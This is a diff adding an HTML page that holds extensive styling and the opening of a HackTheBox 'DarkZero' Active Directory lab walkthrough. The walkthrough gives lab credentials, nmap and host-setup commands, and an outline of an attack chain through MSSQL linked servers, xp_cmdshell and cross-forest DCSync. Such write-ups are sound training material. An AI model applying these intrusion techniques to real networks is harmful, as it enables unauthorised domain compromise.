@@ -1,0 +1,1626 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- ═══════════════════════════════════════════════
+       EDIT THIS: Page title
+  ═══════════════════════════════════════════════ -->
+  <title>SYSTEM://HTB DarkZero Writeup</title>
+  <title>SYSTEM://HTB DarkZero Writeup</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Exo+2:ital,wght@0,300;0,400;0,600;1,400&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+
+  <style>
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           DESIGN TOKENS                      ║
+       ╚══════════════════════════════════════════════╝ */
+    :root {
+      /* Core palette */
+      --cp-void:        #05050a;
+      --cp-deep:        #0a0a12;
+      --cp-surface:     #0d0d18;
+      --cp-surface-2:   #12121f;
+      --cp-surface-3:   #181828;
+      --cp-border:      #1e1e35;
+
+      /* Neon accents */
+      --cp-cyan:        #00f5ff;
+      --cp-cyan-dim:    #007a80;
+      --cp-cyan-glow:   rgba(0, 245, 255, 0.25);
+      --cp-cyan-muted:  rgba(0, 245, 255, 0.08);
+
+      --cp-magenta:     #ff0080;
+      --cp-magenta-dim: #7a003d;
+      --cp-magenta-glow: rgba(255, 0, 128, 0.25);
+
+      --cp-green:       #39ff14;
+      --cp-green-dim:   #1a7a08;
+      --cp-green-glow:  rgba(57, 255, 20, 0.2);
+
+      --cp-amber:       #ffb800;
+      --cp-amber-glow:  rgba(255, 184, 0, 0.2);
+
+      /* Text */
+      --cp-text:        #c8d8e8;
+      --cp-text-muted:  #6a7f94;
+      --cp-text-dim:    #3a4f60;
+
+      /* Typography */
+      --font-display: 'Orbitron', 'Courier New', monospace;
+      --font-body:    'Exo 2', 'Segoe UI', sans-serif;
+      --font-mono:    'Share Tech Mono', 'Courier New', monospace;
+
+      /* Spacing — mobile-first (tighter base) */
+      --sp-xs:  0.35rem;
+      --sp-sm:  0.7rem;
+      --sp-md:  1.2rem;
+      --sp-lg:  2rem;
+      --sp-xl:  3rem;
+
+      /* Layout */
+      --max-width:  1000px;
+      --radius:     4px;
+      --radius-lg:  8px;
+      --transition: all 0.2s ease;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           GLOBAL RESET & BASE               ║
+       ╚══════════════════════════════════════════════╝ */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      background: var(--cp-void);
+      scroll-behavior: smooth;
+    }
+
+    body {
+      background: var(--cp-void);
+      min-height: 100vh;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* CRT scanlines overlay — entire page */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0, 0, 0, 0.07) 2px,
+        rgba(0, 0, 0, 0.07) 4px
+      );
+      pointer-events: none;
+      z-index: 9999;
+    }
+
+    /* Circuit grid background */
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(0,245,255,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,245,255,0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: var(--cp-void); }
+    ::-webkit-scrollbar-thumb {
+      background: var(--cp-cyan-dim);
+      border-radius: 2px;
+    }
+    ::-webkit-scrollbar-thumb:hover { background: var(--cp-cyan); }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           TOP BAR / HEADER                  ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-topbar {
+      position: sticky;
+      top: 0;
+      z-index: 500;
+      width: 100%;
+      background: rgba(5, 5, 10, 0.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--cp-cyan-dim);
+      box-shadow: 0 1px 20px var(--cp-cyan-glow);
+      padding: 0.6rem var(--sp-md);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: var(--sp-sm);
+    }
+
+    .cp-topbar-left {
+      display: flex;
+      align-items: center;
+      gap: var(--sp-sm);
+      min-width: 0;
+    }
+
+    /* Blinking status dot */
+    .cp-status-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--cp-green);
+      box-shadow: 0 0 8px var(--cp-green);
+      flex-shrink: 0;
+      animation: blink-dot 2s ease-in-out infinite;
+    }
+
+    @keyframes blink-dot {
+      0%, 100% { opacity: 1; }
+      50%       { opacity: 0.2; }
+    }
+
+    .cp-topbar-brand {
+      font-family: var(--font-display);
+      font-size: clamp(0.7rem, 2.5vw, 0.85rem);
+      font-weight: 900;
+      letter-spacing: 0.15em;
+      color: var(--cp-cyan);
+      text-shadow: 0 0 12px var(--cp-cyan-glow);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .cp-topbar-brand span { color: var(--cp-magenta); }
+
+    /* EDIT: category tag */
+    .cp-topbar-tag {
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      letter-spacing: 0.1em;
+      color: var(--cp-text-dim);
+      border: 1px solid var(--cp-border);
+      padding: 0.15em 0.5em;
+      border-radius: var(--radius);
+      white-space: nowrap;
+      display: none; /* hidden on very small screens */
+    }
+
+    @media (min-width: 400px) {
+      .cp-topbar-tag { display: inline; }
+    }
+
+    .cp-topbar-right {
+      font-family: var(--font-mono);
+      font-size: 0.6rem;
+      color: var(--cp-text-dim);
+      letter-spacing: 0.05em;
+      flex-shrink: 0;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           MAIN CONTENT WRAPPER              ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body {
+      position: relative;
+      z-index: 1;
+      font-family:  var(--font-body);
+      font-size:    clamp(0.95rem, 2.5vw, 1.05rem);
+      line-height:  1.8;
+      color:        var(--cp-text);
+      background:   var(--cp-surface);
+      max-width:    var(--max-width);
+      margin:       0 auto;
+      padding:      var(--sp-lg) var(--sp-md);
+      min-height:   100vh;
+
+      /* Left cyan accent line */
+      border-left:  2px solid var(--cp-cyan-dim);
+      border-right: 2px solid var(--cp-magenta-dim);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           HEADINGS                          ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body h1, .cp-body h2, .cp-body h3,
+    .cp-body h4, .cp-body h5, .cp-body h6 {
+      font-family:    var(--font-display);
+      line-height:    1.2;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-top:     var(--sp-xl);
+      margin-bottom:  var(--sp-md);
+    }
+
+    /* H1 — Glitch effect */
+    .cp-body h1 {
+      font-size:   clamp(1.6rem, 5vw, 2.8rem);
+      font-weight: 900;
+      color:       var(--cp-cyan);
+      text-shadow:
+        0 0 20px var(--cp-cyan-glow),
+        0 0 60px rgba(0,245,255,0.1);
+      margin-top:  0;
+      position:    relative;
+      padding-bottom: var(--sp-sm);
+    }
+
+    /* Glitch underline bar */
+    .cp-body h1::after {
+      content:  '';
+      display:  block;
+      height:   3px;
+      width:    100%;
+      margin-top: var(--sp-xs);
+      background: linear-gradient(
+        90deg,
+        var(--cp-cyan),
+        var(--cp-magenta) 60%,
+        transparent
+      );
+      animation: glitch-bar 4s ease-in-out infinite;
+    }
+
+    @keyframes glitch-bar {
+      0%, 90%, 100% { transform: scaleX(1); opacity: 1; }
+      92%            { transform: scaleX(0.95) translateX(4px); opacity: 0.8; }
+      94%            { transform: scaleX(1.02) translateX(-3px); opacity: 1; }
+      96%            { transform: scaleX(0.98) translateX(2px); opacity: 0.9; }
+    }
+
+    /* Glitch text flicker on h1 */
+    .cp-body h1 {
+      animation: glitch-text 6s ease-in-out infinite;
+    }
+
+    @keyframes glitch-text {
+      0%, 88%, 100% {
+        text-shadow: 0 0 20px var(--cp-cyan-glow), 0 0 60px rgba(0,245,255,0.1);
+        transform: none;
+      }
+      90% {
+        text-shadow:
+          -3px 0 var(--cp-magenta),
+          3px 0 var(--cp-cyan),
+          0 0 20px var(--cp-cyan-glow);
+        transform: skewX(-1deg);
+      }
+      92% {
+        text-shadow: 0 0 20px var(--cp-cyan-glow);
+        transform: none;
+      }
+      94% {
+        text-shadow:
+          2px 0 var(--cp-magenta),
+          -2px 0 var(--cp-cyan);
+        transform: skewX(0.5deg);
+      }
+    }
+
+    /* H2 */
+    .cp-body h2 {
+      font-size:  clamp(1.2rem, 3.5vw, 1.8rem);
+      color:      var(--cp-cyan);
+      position:   relative;
+      padding:    var(--sp-sm) var(--sp-md);
+      background: var(--cp-cyan-muted);
+      border-left: 3px solid var(--cp-cyan);
+      border-radius: 0 var(--radius) var(--radius) 0;
+    }
+
+    .cp-body h2::before {
+      content:     '// ';
+      color:       var(--cp-cyan-dim);
+      font-family: var(--font-mono);
+      font-size:   0.8em;
+    }
+
+    /* H3 */
+    .cp-body h3 {
+      font-size: clamp(1rem, 3vw, 1.4rem);
+      color:     var(--cp-magenta);
+      text-shadow: 0 0 12px var(--cp-magenta-glow);
+    }
+
+    .cp-body h3::before {
+      content:     '> ';
+      font-family: var(--font-mono);
+      color:       var(--cp-magenta-dim);
+      font-size:   0.9em;
+    }
+
+    /* H4–H6 */
+    .cp-body h4 {
+      font-size: 1.05rem;
+      color:     var(--cp-amber);
+      letter-spacing: 0.1em;
+    }
+    .cp-body h4::before { content: '## '; font-family: var(--font-mono); color: var(--cp-text-dim); font-size: 0.8em; }
+
+    .cp-body h5 { font-size: 0.95rem; color: var(--cp-text); }
+    .cp-body h6 { font-size: 0.85rem; color: var(--cp-text-muted); }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           PARAGRAPHS & INLINE               ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body p {
+      margin-bottom: var(--sp-md);
+      font-weight:   300;
+      color:         var(--cp-text);
+    }
+
+    .cp-body p:last-child { margin-bottom: 0; }
+
+    .cp-body strong, .cp-body b {
+      color:       var(--cp-cyan);
+      font-weight: 600;
+    }
+
+    .cp-body em, .cp-body i {
+      color:      var(--cp-text-muted);
+      font-style: italic;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           LINKS                             ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body a {
+      color:           var(--cp-cyan);
+      text-decoration: none;
+      border-bottom:   1px dashed var(--cp-cyan-dim);
+      transition:      var(--transition);
+      font-weight:     600;
+      font-family:     var(--font-mono);
+      font-size:       0.95em;
+    }
+
+    .cp-body a:hover {
+      color:        var(--cp-cyan);
+      border-color: var(--cp-cyan);
+      text-shadow:  0 0 10px var(--cp-cyan-glow);
+      background:   var(--cp-cyan-muted);
+      padding:      0 0.2em;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           HORIZONTAL RULE                   ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body hr {
+      border: none;
+      height: 1px;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        var(--cp-magenta),
+        var(--cp-cyan),
+        transparent
+      );
+      margin: var(--sp-xl) 0;
+      position: relative;
+    }
+
+    .cp-body hr::before {
+      content:    '◈';
+      position:   absolute;
+      left:       50%;
+      top:        50%;
+      transform:  translate(-50%, -50%);
+      color:      var(--cp-cyan);
+      font-size:  0.9rem;
+      background: var(--cp-surface);
+      padding:    0 var(--sp-sm);
+      text-shadow: 0 0 10px var(--cp-cyan-glow);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           BLOCKQUOTE                        ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body blockquote {
+      position:     relative;
+      margin:       var(--sp-lg) 0;
+      padding:      var(--sp-md) var(--sp-lg);
+      background:   rgba(255, 0, 128, 0.05);
+      border-left:  3px solid var(--cp-magenta);
+      border-radius: 0 var(--radius) var(--radius) 0;
+      color:        var(--cp-text-muted);
+      font-style:   italic;
+
+      /* Corner brackets */
+      outline: 1px solid rgba(255, 0, 128, 0.15);
+    }
+
+    /* Top-right corner bracket */
+    .cp-body blockquote::before {
+      content:    '⌝';
+      position:   absolute;
+      top:        -0.6rem;
+      right:      0.5rem;
+      font-size:  1.8rem;
+      color:      var(--cp-magenta);
+      opacity:    0.5;
+      line-height: 1;
+    }
+
+    .cp-body blockquote::after {
+      content:    '⌞';
+      position:   absolute;
+      bottom:     -0.8rem;
+      left:       0.5rem;
+      font-size:  1.8rem;
+      color:      var(--cp-magenta);
+      opacity:    0.5;
+      line-height: 1;
+    }
+
+    .cp-body blockquote p { margin: 0; }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           LISTS                             ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body ul, .cp-body ol {
+      margin:       var(--sp-md) 0;
+      padding-left: var(--sp-lg);
+    }
+
+    .cp-body li { margin-bottom: var(--sp-xs); }
+
+    /* Unordered */
+    .cp-body ul { list-style: none; padding-left: var(--sp-md); }
+
+    .cp-body ul > li {
+      position:    relative;
+      padding-left: var(--sp-lg);
+    }
+
+    .cp-body ul > li::before {
+      content:   '▶';
+      position:  absolute;
+      left:      0;
+      color:     var(--cp-cyan);
+      font-size: 0.55em;
+      top:       0.45em;
+      text-shadow: 0 0 6px var(--cp-cyan-glow);
+    }
+
+    .cp-body ul ul > li::before {
+      content: '◈';
+      color:   var(--cp-magenta);
+      font-size: 0.5em;
+      top: 0.5em;
+    }
+
+    .cp-body ul ul ul > li::before {
+      content: '─';
+      color:   var(--cp-text-dim);
+      font-size: 0.8em;
+    }
+
+    /* Ordered */
+    .cp-body ol { list-style: decimal; }
+    .cp-body ol li::marker {
+      color:       var(--cp-cyan);
+      font-family: var(--font-mono);
+      font-size:   0.9em;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           CODE                              ║
+       ╚══════════════════════════════════════════════╝ */
+
+    /* Inline code */
+    .cp-body code {
+      font-family:  var(--font-mono);
+      font-size:    0.88em;
+      color:        var(--cp-green);
+      background:   rgba(57, 255, 20, 0.07);
+      border:       1px solid var(--cp-green-dim);
+      padding:      0.1em 0.4em;
+      border-radius: var(--radius);
+      white-space:  nowrap;
+      text-shadow:  0 0 6px var(--cp-green-glow);
+    }
+
+    /* Code block */
+    .cp-body pre {
+      background:    var(--cp-surface-2);
+      border:        1px solid var(--cp-border);
+      border-top:    2px solid var(--cp-cyan);
+      border-radius: var(--radius-lg);
+      padding:       var(--sp-lg);
+      overflow-x:    auto;
+      margin:        var(--sp-lg) 0;
+      position:      relative;
+      box-shadow:
+        0 0 0 1px rgba(0,245,255,0.05),
+        0 8px 32px rgba(0,0,0,0.6),
+        inset 0 1px 0 rgba(0,245,255,0.08);
+
+      /* Subtle glow around the block */
+      filter: drop-shadow(0 0 8px rgba(0,245,255,0.05));
+    }
+
+    /* Terminal header bar */
+    .cp-body pre::before {
+      content:     'TERMINAL://EXEC';
+      display:     block;
+      font-family: var(--font-mono);
+      font-size:   0.6rem;
+      letter-spacing: 0.2em;
+      color:       var(--cp-cyan-dim);
+      margin-bottom: var(--sp-sm);
+      padding-bottom: var(--sp-sm);
+      border-bottom: 1px solid var(--cp-border);
+    }
+
+    .cp-body pre code {
+      background:  transparent;
+      border:      none;
+      padding:     0;
+      color:       var(--cp-green);
+      font-size:   0.9rem;
+      line-height: 1.7;
+      white-space: pre;
+      text-shadow: 0 0 4px var(--cp-green-glow);
+    }
+
+    /* Blinking cursor at end of code blocks */
+    .cp-body pre::after {
+      content:    '█';
+      color:      var(--cp-cyan);
+      font-family: var(--font-mono);
+      font-size:   0.85rem;
+      display:    inline-block;
+      animation:  cursor-blink 1.1s step-end infinite;
+      margin-left: 2px;
+      opacity:    0.7;
+    }
+
+    @keyframes cursor-blink {
+      0%, 100% { opacity: 0.7; }
+      50%       { opacity: 0; }
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           TABLES                            ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body table {
+      width:           100%;
+      border-collapse: collapse;
+      margin:          var(--sp-lg) 0;
+      font-size:       0.9rem;
+      font-family:     var(--font-mono);
+      border:          1px solid var(--cp-border);
+      border-radius:   var(--radius-lg);
+      overflow:        hidden;
+      box-shadow:      0 0 20px rgba(0,245,255,0.05);
+    }
+
+    .cp-body thead {
+      background: linear-gradient(135deg, #0a1520, #0d1a2a);
+      border-bottom: 2px solid var(--cp-cyan);
+    }
+
+    .cp-body thead th {
+      font-family:    var(--font-display);
+      font-size:      0.7rem;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color:          var(--cp-cyan);
+      padding:        var(--sp-sm) var(--sp-md);
+      text-align:     left;
+      text-shadow:    0 0 8px var(--cp-cyan-glow);
+    }
+
+    .cp-body tbody tr {
+      background:  var(--cp-surface-2);
+      transition:  var(--transition);
+      border-bottom: 1px solid var(--cp-border);
+    }
+
+    .cp-body tbody tr:nth-child(even) {
+      background: var(--cp-surface-3);
+    }
+
+    .cp-body tbody tr:hover {
+      background:  rgba(0, 245, 255, 0.05);
+      box-shadow:  inset 3px 0 0 var(--cp-cyan);
+    }
+
+    .cp-body td {
+      padding:       var(--sp-sm) var(--sp-md);
+      color:         var(--cp-text);
+      vertical-align: top;
+    }
+
+    /* Mobile table scroll */
+    @media (max-width: 520px) {
+      .cp-body table { display: block; overflow-x: auto; }
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           IMAGES                            ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body img {
+      max-width:    100%;
+      height:       auto;
+      display:      block;
+      border-radius: var(--radius-lg);
+      margin:       var(--sp-lg) auto;
+      border:       1px solid var(--cp-border);
+      box-shadow:
+        0 0 0 1px var(--cp-cyan-dim),
+        0 8px 40px rgba(0,0,0,0.7),
+        0 0 20px rgba(0,245,255,0.05);
+      transition:   var(--transition);
+      filter:       saturate(0.85);
+    }
+
+    .cp-body img:hover {
+      border-color: var(--cp-cyan);
+      box-shadow:
+        0 0 0 1px var(--cp-cyan),
+        0 12px 60px rgba(0,0,0,0.8),
+        0 0 30px var(--cp-cyan-glow);
+      filter:     saturate(1.1);
+      transform:  scale(1.01);
+    }
+
+    .cp-body figcaption {
+      text-align:    center;
+      font-size:     0.78rem;
+      font-family:   var(--font-mono);
+      color:         var(--cp-text-dim);
+      margin-top:    calc(-1 * var(--sp-sm));
+      margin-bottom: var(--sp-lg);
+      letter-spacing: 0.05em;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           MISC INLINE ELEMENTS              ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body kbd {
+      font-family:   var(--font-mono);
+      font-size:     0.8em;
+      color:         var(--cp-cyan);
+      background:    var(--cp-surface-3);
+      border:        1px solid var(--cp-cyan-dim);
+      border-bottom: 2px solid var(--cp-cyan-dim);
+      border-radius: var(--radius);
+      padding:       0.1em 0.5em;
+      text-shadow:   0 0 6px var(--cp-cyan-glow);
+    }
+
+    .cp-body mark {
+      background:    rgba(255, 184, 0, 0.15);
+      color:         var(--cp-amber);
+      border-radius: 2px;
+      padding:       0.05em 0.3em;
+      font-family:   var(--font-mono);
+      font-size:     0.9em;
+    }
+
+    .cp-body abbr[title] {
+      color:          var(--cp-cyan);
+      text-decoration: underline dotted var(--cp-cyan-dim);
+      cursor:         help;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           DETAILS / SUMMARY                 ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-body details {
+      background:    var(--cp-surface-2);
+      border:        1px solid var(--cp-border);
+      border-left:   2px solid var(--cp-cyan-dim);
+      border-radius: var(--radius-lg);
+      padding:       var(--sp-md);
+      margin:        var(--sp-md) 0;
+      transition:    border-color 0.2s;
+    }
+
+    .cp-body details[open] {
+      border-left-color: var(--cp-cyan);
+      box-shadow: inset 0 0 20px rgba(0,245,255,0.03);
+    }
+
+    .cp-body summary {
+      font-family:    var(--font-display);
+      font-size:      0.85rem;
+      letter-spacing: 0.1em;
+      color:          var(--cp-cyan);
+      cursor:         pointer;
+      user-select:    none;
+      list-style:     none;
+      display:        flex;
+      align-items:    center;
+      gap:            var(--sp-sm);
+      text-transform: uppercase;
+    }
+
+    .cp-body summary::before {
+      content:    '▶';
+      font-size:  0.65em;
+      transition: transform 0.2s ease;
+      color:      var(--cp-cyan-dim);
+    }
+
+    .cp-body details[open] > summary::before {
+      transform: rotate(90deg);
+      color:     var(--cp-cyan);
+    }
+
+    .cp-body details > *:not(summary) {
+      margin-top: var(--sp-md);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           SELECTION                         ║
+       ╚══════════════════════════════════════════════╝ */
+    ::selection {
+      background: rgba(0, 245, 255, 0.2);
+      color:      var(--cp-cyan);
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           FOOTER                            ║
+       ╚══════════════════════════════════════════════╝ */
+    .cp-footer {
+      position:   relative;
+      z-index:    1;
+      max-width:  var(--max-width);
+      margin:     0 auto;
+      padding:    var(--sp-md);
+      border-top: 1px solid var(--cp-border);
+      display:    flex;
+      flex-wrap:  wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap:        var(--sp-sm);
+      font-family: var(--font-mono);
+      font-size:  0.65rem;
+      letter-spacing: 0.08em;
+      color:      var(--cp-text-dim);
+      text-transform: uppercase;
+    }
+
+    .cp-footer a {
+      color:      var(--cp-cyan-dim);
+      text-decoration: none;
+      border:     none;
+      font-family: var(--font-mono);
+      transition: var(--transition);
+    }
+
+    .cp-footer a:hover {
+      color:      var(--cp-cyan);
+      text-shadow: 0 0 8px var(--cp-cyan-glow);
+    }
+
+    .cp-footer-sig {
+      color: var(--cp-text-dim);
+      font-size: 0.6rem;
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           RESPONSIVE BREAKPOINTS            ║
+       ╚══════════════════════════════════════════════╝ */
+
+    /* Small phones */
+    @media (max-width: 380px) {
+      .cp-body {
+        padding:   var(--sp-md) var(--sp-sm);
+        font-size: 0.9rem;
+        border-left-width: 1px;
+        border-right-width: 1px;
+      }
+      .cp-body h1 { font-size: 1.4rem; }
+      .cp-body h2 { font-size: 1.1rem; }
+      .cp-body h3 { font-size: 1rem; }
+      .cp-body pre { padding: var(--sp-md) var(--sp-sm); font-size: 0.78rem; }
+    }
+
+    /* Tablets and up */
+    @media (min-width: 768px) {
+      .cp-body {
+        padding:   var(--sp-xl) var(--sp-lg);
+        font-size: 1.05rem;
+      }
+      :root {
+        --sp-md: 1.4rem;
+        --sp-lg: 2.4rem;
+        --sp-xl: 3.4rem;
+      }
+    }
+
+    /* ╔══════════════════════════════════════════════╗
+       ║           PRINT                             ║
+       ╚══════════════════════════════════════════════╝ */
+    @media print {
+      body::before, body::after { display: none; }
+      .cp-topbar, .cp-footer    { display: none; }
+      .cp-body {
+        background: #fff;
+        color: #111;
+        border: none;
+        max-width: 100%;
+      }
+      .cp-body h1,.cp-body h2,.cp-body h3 { color: #000; text-shadow: none; animation: none; }
+      .cp-body a { color: #000; border-bottom: 1px solid #000; }
+      .cp-body pre, .cp-body code { background: #f0f0f0; color: #111; text-shadow: none; }
+    }
+
+  </style>
+</head>
+<body>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       TOP BAR
+       EDIT: .cp-topbar-brand  → your site name
+             .cp-topbar-tag    → your category
+  ═══════════════════════════════════════════════════════════ -->
+  <header class="cp-topbar">
+    <div class="cp-topbar-left">
+      <div class="cp-status-dot"></div>
+      <span class="cp-topbar-brand"><span>M</span>NOTES<span>//</span>SEC</span>
+      <span class="cp-topbar-tag">CYBER · LABS · INTEL</span>
+    </div>
+    <div class="cp-topbar-right" id="cp-clock">SYSTEM ONLINE</div>
+  </header>
+
+
+  <!-- ═══════════════════════════════════════════════════════════
+       CONTENT ZONE
+       PASTE your markdown-converted HTML between the markers.
+       Keep <main class="cp-body"> — it applies all styles.
+  ═══════════════════════════════════════════════════════════ -->
+  <main class="cp-body">
+
+<h2>HackTheBox DarkZero Walkthrough Summary</h2>
+<p>DarkZero is a <strong>two-forest assume-breach Active Directory</strong> lab. The attack chain is:</p>
+<ol>
+<li>Start with low-privileged domain creds (<code>john.w</code>) in <code>darkzero.htb</code></li>
+<li>Enumerate MSSQL on DC01 → discover a linked server to DC02 in the <code>darkzero.ext</code> forest</li>
+<li>The mapped login (<code>dc01_sql_svc</code>) is <strong>sysadmin</strong> on DC02&#39;s MSSQL</li>
+<li>Enable <code>xp_cmdshell</code> → shell as <code>svc_sql</code> on DC02</li>
+<li>Escalate to SYSTEM on DC02 via <strong>one of four paths</strong></li>
+<li>As SYSTEM on DC02, abuse the <strong>cross-forest TGT delegation</strong> to capture DC01&#39;s machine account TGT → DCSync DC01</li>
+</ol>
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#01--environment--credentials">01 · Environment &amp; Credentials</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#02--recon--nmap">02 · Recon — Nmap</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#03--smb-enumeration">03 · SMB Enumeration</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#04--bloodhound-collection">04 · BloodHound Collection</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#05--mssql-enumeration--linked-server-abuse">05 · MSSQL Enumeration &amp; Linked Server Abuse</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#06--shell-as-svc_sql-on-dc02">06 · Shell as svc_sql on DC02</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#07--post-exploitation-enumeration-on-dc02">07 · Post-Exploitation Enumeration on DC02</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#08--path-1--token-theft-via-named-pipe--godpotato-unintended">08 · Path 1 — Token Theft via Named Pipe + GodPotato (Unintended)</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#09--path-2--adcs--password-change--runascs-intended">09 · Path 2 — ADCS + Password Change + RunAsCS (Intended)</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#10--path-3--ntlm-authentication-reflection-via-cmti-dns-record-unintended">10 · Path 3 — NTLM Authentication Reflection via CMTI DNS Record (Unintended)</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#11--path-4--cve-2024-30088-unintended">11 · Path 4 — CVE-2024-30088 (Unintended)</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#12--cross-forest-trust-abuse--dc01-domain-compromise">12 · Cross-Forest Trust Abuse → DC01 Domain Compromise</a></li>
+<li><a href="https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#key-concepts--analyst-notes">Key Concepts &amp; Analyst Notes</a></li>
+</ul>
+<hr>
+<h2>01 · Environment &amp; Credentials</h2>
+<p><strong>Given credentials (assume-breach scenario):</strong></p>
+<table>
+<thead>
+<tr>
+<th>Account</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>darkzero.htb\john.w</code></td>
+<td><code>RFulUtONCOL!</code></td>
+</tr>
+</tbody></table>
+<p><strong>Network topology:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>IP</th>
+<th>Domain</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DC01</td>
+<td>10.129.5.34</td>
+<td>darkzero.htb</td>
+<td>Domain Controller, Forest 1</td>
+</tr>
+<tr>
+<td>DC02</td>
+<td>172.16.20.2</td>
+<td>darkzero.ext</td>
+<td>Domain Controller, Forest 2</td>
+</tr>
+</tbody></table>
+<ul>
+<li>DC02 is <strong>not directly reachable</strong> from the attacker — pivoting via Chisel is required</li>
+<li>Bidirectional <strong>cross-forest trust</strong> exists between <code>darkzero.htb</code> ↔ <code>darkzero.ext</code></li>
+</ul>
+<pre><code class="language-bash"># Add DC01 to /etc/hosts
+netexec smb 10.129.5.34 --generate-hosts-file hosts
+cat hosts /etc/hosts | sudo sponge /etc/hosts
+
+# Sync time if Kerberos auth is failing (clock skew)
+sudo ntpdate DC01.darkzero.htb
+</code></pre>
+<hr>
+<h2>02 · Recon — Nmap</h2>
+<pre><code class="language-bash"># Fast full port scan
+sudo nmap -p- -vvv --min-rate 10000 10.129.5.34
+
+# Service/version scan on key ports
+sudo nmap -p 53,88,139,389,445,464,593,636,1433,2179,3268,3269,5985 -sCV 10.129.5.34
+</code></pre>
+<p><strong>Key open ports on DC01:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>53</td>
+<td>DNS</td>
+<td>Standard DC port</td>
+</tr>
+<tr>
+<td>88</td>
+<td>Kerberos</td>
+<td>Standard DC port</td>
+</tr>
+<tr>
+<td>389 / 636</td>
+<td>LDAP / LDAPS</td>
+<td>Standard DC port</td>
+</tr>
+<tr>
+<td>445</td>
+<td>SMB</td>
+<td>Signing enforced — relay attacks blocked</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MSSQL</td>
+<td><strong>SQL Server 2022</strong> — non-standard for a DC</td>
+</tr>
+<tr>
+<td>2179</td>
+<td>Hyper-V RDP</td>
+<td>Can connect with creds + VM GUID</td>
